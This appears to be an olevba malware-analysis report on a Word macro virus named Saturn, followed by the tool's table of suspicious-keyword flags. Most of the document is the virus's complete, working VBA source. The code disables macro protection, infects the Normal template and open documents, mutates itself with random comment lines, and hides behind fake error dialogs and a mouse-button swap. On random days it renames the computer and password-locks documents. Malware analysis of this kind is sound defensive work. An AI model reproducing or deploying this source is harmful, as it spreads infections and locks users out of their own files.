olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Saturn
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Saturn - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Saturn.bas 
in file: ./Virus.MSWord.Saturn - OLE stream: 'Macros/VBA/Saturn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    ' 244,2413  52,5644 87,04224    148,9341    4,012784
Private Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" (ByVal lpComputerName As String) As Long

Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long
    ' 95,71773  5,916266    16,87243    59,705  6,284245

Sub AutoOpen()

On Error Resume Next

Application.ScreenUpdating = False

Application.DisplayAlerts = wdAlertsNone

Options.VirusProtection = False
    ' 208,377   72,45839    41,81892    141,3382    18,56623

DocInfect = False

GlobInfect = False

    ' 356,7178  36,77126    120,5901    107,297 40,80378
For b = 1 To ActiveDocument.VBProject.VBComponents.Count

If ActiveDocument.VBProject.VBComponents(b).Name = "Saturn" Then

DocInfect = True

End If

Next

For U = 1 To NormalTemplate.VBProject.VBComponents.Count

    ' 308,9056  36,33663    57,1237 26,9966 34,51539
If NormalTemplate.VBProject.VBComponents(U).Name = "Saturn" Then

GlobInfect = True

End If

Next

If DocInfect = False Then

    ' 242,9122  8,509574    159,9063    121,7117    0,7694919
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Saturn", Object:=wdOrganizerObjectProjectItems

ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate

    ' 306,5092  20,53032    14,38345    5,571109    15,81317
End If
    ' 25,29504  19,50761    156,6525    10,96492    19,12428

    ' 73,00089  13,02573    103,4539    73,81318    20,22557
If GlobInfect = False Then
    ' 418,3166  50,53939    100,4227    77,12215    4,800717

    ' 173,8149  24,07764    151,7714    176,3693    19,66734
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Saturn", Object:=wdOrganizerObjectProjectItems

Options.SaveNormalPrompt = False

End If

Saturn

Application.DisplayAlerts = wdAlertsAll

    ' 222,9021  12,45305    75,91347    46,30818    30,80884
End Sub

    ' 437,6887  69,71567    8,997898    170,9202    17,83692
Sub AutoClose()

On Error Resume Next

Call UMP

Saturn

Call UMP

ActiveDocument.Save

End Sub

Sub Stealth()

On Error Resume Next

    ' 94,47042  26,37888    15,26865    106,1627    8,3238
Call UMP

RM = Int(Rnd * 5) + 1

If RM = 1 Then smeg$ = "Not enough memory to perform this operation"

If RM = 2 Then smeg$ = "Impossible open this function"
    ' 349,0358  4,280362    94,79332    84,36602    14,61011

If RM = 3 Then smeg$ = "Function does not answer system requests"
    ' 71,11751  75,08361    104,7199    91,09573    19,1331

If RM = 4 Then smeg$ = "This program has performed an illegal operation and will be locked"

    ' 315,9908  73,0974 133,5707    4,073256    26,62467
If RM = 5 Then smeg$ = "This option at present not available"

steMsgType = vbCritical + vbOKCancel + vbMsgBoxHelpButton
    ' 45,52377  8,241811    127,8215    51,20645    2,236809
    ' 131,7509  24,15584    123,9584    2,523175    37,27546

    ' 448,6724  72,87714    36,29856    125,1208    48,02016
message = MsgBox(smeg$, steMsgType, "Microsoft Word")

If vbOKCancel Then

SMB = SwapMouseButton(&H4)
    ' 294,7586  21,10344    44,69473    149,3643    40,4055

Documents.Close

End If

End Sub

Sub ToolsMacro()

Stealth

End Sub

    ' 148,4238  50,65431    33,20978    33,48243    28,58459
Sub ToolsCustomize()

Stealth

End Sub

Sub ViewVBCode()

Stealth

End Sub

Sub Saturn()
    ' 135,2524  18,82258    76,87595    45,82834    16,68972

On Error Resume Next

'Saturn by ULTRAS [SOS]

    ' 322,6122  3,628221    66,24523    155,2715    38,73352
If Day(Now()) = Int(Rnd() * 30 + 1) Then

Computer = SetComputerName("SOS")

ActiveDocument.Password = "SOS" & Int(Rnd * 333) + 1

ActiveDocument.Save

End If

End Sub

Sub UMP()

'ULTRAS MACRO POLYMORPHIC

    ' 195,7688  54,23582    80,39262    92,47275    22,68602
PoNu = Int(Rnd() * 28 + 1)
    ' 241,2467  7,171311    121,2367    72,33157    22,63184
    ' 44,55807  35,509  43,67149    157,0584    36,7837

For Mutate = 1 To PoNu

PoRL = Application.VBE.ActiveVBProject.VBComponents("Saturn").CodeModule.CountOfLines

PoLi = Int(Rnd() * PoRL + 1)

a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49

Application.VBE.ActiveVBProject.VBComponents("Saturn").CodeModule.InsertLines PoLi, vbTab & "' " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e

Next Mutate

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

